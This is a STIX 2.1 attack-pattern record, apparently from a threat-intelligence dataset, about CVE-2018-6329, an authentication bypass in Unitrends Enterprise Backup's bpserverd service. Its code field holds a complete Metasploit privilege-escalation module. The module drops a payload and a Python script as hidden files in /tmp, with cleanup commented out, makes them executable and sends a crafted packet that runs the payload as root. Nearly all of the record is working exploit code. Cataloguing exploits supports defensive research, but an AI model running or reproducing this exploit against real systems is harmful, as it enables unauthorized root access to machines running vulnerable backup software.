{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d129af14-f3da-4f90-a2fa-cc38554aa7aa",
    "created": "2024-08-14T16:59:29.334697Z",
    "modified": "2024-08-14T16:59:29.334717Z",
    "name": "Unitrends Enterprise Backup bpserverd Privilege Escalation",
    "description": " It was discovered that the Unitrends bpserverd proprietary protocol, as exposed via xinetd has an issue in which its authentication can be bypassed.  A remote attacker could use this issue to execute arbitrary commands with root privilege on the target system. This is very similar to exploits/linux/misc/ueb9_bpserverd however it runs against the localhost by dropping a python script on the local file system.  Unitrends stopped bpserverd from listening remotely on version 10.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/ueb_bpserverd_privesc.rb",
            "external_id": "ueb_bpserverd_privesc.rb"
        },
        {
            "source_name": "reference",
            "url": "https://support.unitrends.com/UnitrendsBackup/s/article/000005691"
        },
        {
            "source_name": "reference",
            "url": "http://blog.redactedsec.net/exploits/2018/04/20/UEB9_tcp.html"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-6329"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info={})\n    super(update_info(info, {\n      'Name'           => 'Unitrends Enterprise Backup bpserverd Privilege Escalation',\n      'Description'    => %q{\n        It was discovered that the Unitrends bpserverd proprietary protocol, as exposed via xinetd,\n        has an issue in which its authentication can be bypassed.  A remote attacker could use this\n        issue to execute arbitrary commands with root privilege on the target system.\n        This is very similar to exploits/linux/misc/ueb9_bpserverd however it runs against the\n        localhost by dropping a python script on the local file system.  Unitrends stopped\n        bpserverd from listening remotely on version 10.\n       },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Cale Smith', # @0xC413\n          'Benny Husted', # @BennyHusted\n          'Jared Arave', # @iotennui\n          'h00die' # msf adaptations\n        ],\n      'DisclosureDate' => '2018-03-14',\n      'Platform'       => 'linux',\n      'Arch'           => [ARCH_X86],\n      'References'     =>\n        [\n          ['URL', 'https://support.unitrends.com/UnitrendsBackup/s/article/000005691'],\n          ['URL', 'http://blog.redactedsec.net/exploits/2018/04/20/UEB9_tcp.html'],\n          ['EDB', '44297'],\n          ['CVE', '2018-6329']\n        ],\n      'Targets'        =>\n        [\n          [ 'UEB <= 10.0', { } ]\n        ],\n      'DefaultOptions' => { 'PrependFork' => true, 'WfsDelay' => 2 },\n      'SessionTypes'   => ['shell', 'meterpreter'],\n      'DefaultTarget'  => 0\n      }\n    ))\n    register_advanced_options([\n      OptString.new(\"WritableDir\", [true, \"A directory where we can write files\", \"/tmp\"]),\n      OptInt.new(\"BPSERVERDPORT\", [true, \"Port bpserverd is running on\", 1743])\n    ])\n  end\n\n  def exploit\n\n    pl = generate_payload_exe\n    exe_path = \"#{datastore['WritableDir']}/.#{rand_text_alphanumeric 5..10}\"\n    print_status(\"Writing payload executable to '#{exe_path}'\")\n\n    write_file(exe_path, pl)\n    #register_file_for_cleanup(exe_path)\n\npe_script = %Q{\nimport socket\nimport binascii\nimport struct\nimport time\nimport sys\n\nRHOST = '127.0.0.1'\nXINETDPORT = #{datastore['BPSERVERDPORT']}\ncmd = \"#{exe_path}\"\n\ndef recv_timeout(the_socket,timeout=2):\n    the_socket.setblocking(0)\n    total_data=[];data='';begin=time.time()\n    while 1:\n        #if you got some data, then break after wait sec\n        if total_data and time.time()-begin>timeout:\n            break\n        #if you got no data at all, wait a little longer\n        elif time.time()-begin>timeout*2:\n            break\n        try:\n            data=the_socket.recv(8192)\n            if data:\n                total_data.append(data)\n                begin=time.time()\n            else:\n                time.sleep(0.1)\n        except:\n            pass\n    return ''.join(total_data)\n\nprint \"[+] attempting to connect to xinetd on {0}:{1}\".format(RHOST, str(XINETDPORT))\n\ntry:\n  s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n  s1.connect((RHOST,XINETDPORT))\nexcept:\n  print \"[!] Failed to connect!\"\n  exit()\n\ndata = s1.recv(4096)\nbpd_port = int(data[-8:-3])\n\ntry:\n  pass\n  s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n  s2.connect((RHOST, bpd_port))\nexcept:\n  print \"[!] Failed to connect!\"\n  s1.close()\n  exit()\n\nprint \"[+] Connected! Sending the following cmd to {0}:{1}\".format(RHOST,str(XINETDPORT))\nprint \"[+] '{0}'\".format(cmd)\n\ncmd_len = chr(len(cmd) + 3)\npacket_len = chr(len(cmd) + 23)\n\n#https://github.com/rapid7/metasploit-framework/blob/76954957c740525cff2db5a60bcf936b4ee06c42/modules/exploits/linux/misc/ueb9_bpserverd.rb#L72\npacket = '\\\\xa5\\\\x52\\\\x00\\\\x2d'\npacket += '\\\\x00' * 3\npacket += packet_len\npacket += '\\\\x00' * 3\npacket += '\\\\x01'\npacket += '\\\\x00' * 3\npacket += '\\\\x4c'\npacket += '\\\\x00' * 3\npacket += cmd_len\npacket += cmd\npacket += '\\\\x00' * 3\n\ns1.send(packet)\n\ndata = recv_timeout(s2)\n\nprint data\n\ns1.close()\n}\n\n    pes_path = \"#{datastore['WritableDir']}/.#{rand_text_alphanumeric 5..10}\"\n    print_status(\"Writing privesc script to '#{pes_path}'\")\n\n    write_file(pes_path, pe_script)\n    #register_file_for_cleanup(pes_path)\n\n    print_status(\"Fixing permissions\")\n    cmd_exec(\"chmod +x #{exe_path} #{pes_path}\")\n\n    vprint_status cmd_exec(\"python #{pes_path} -c '#{exe_path}'\")\n  end\n\nend\n\n",
    "x_mitre_disclosure_date": "2018-03-14",
    "x_mitre_platforms": [
        "linux'"
    ]
}